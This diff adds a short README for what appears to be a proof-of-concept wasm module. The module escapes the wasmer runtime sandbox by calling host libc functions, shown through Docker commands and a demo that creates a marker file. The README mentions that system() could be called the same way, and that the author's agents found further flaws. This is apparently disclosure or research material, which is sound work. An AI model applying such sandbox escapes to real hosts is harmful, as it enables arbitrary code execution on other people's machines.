@@ -1,0 +1,30 @@
+= poc alpha
+
+WARNING: pls fix
+
+Proof of concept of a wasm module that exploits wasmer and executes arbitrary code on the host machine.
+
+[source,console]
+----
+$ docker build -t ubuntu-wasmer .
+$ docker run --rm -it ubuntu-wasmer
+
+# File does not exist yet
+$ stat -t /tmp/wasmer-exploit-success
+stat: No such file or directory
+# Run the poc
+$ wasmer run --llvm /poc
+[NATIVE JIT] Wasmer sandbox escape!
+# File exists now because the wasm module found the open and write host libc functions and called them.
+# It could also call any other libc function, like system() to execute arbitrary commands on the host machine.
+$ stat -t /tmp/wasmer-exploit-success
+/tmp/wasmer-exploit-success 0 0 8180 ...
+----
+
+As this is binary exploitation, it depends a bit on the host machine and the version of wasmer. It is tested in the supplied docker image on x86_64.
+
+See link:poc/poc.wat[poc.wat] for more details.
+
+== More vulnerabilities
+
+This is not the only vulnerability of that kind my agents found, just the first one where I produced a nice poc. 
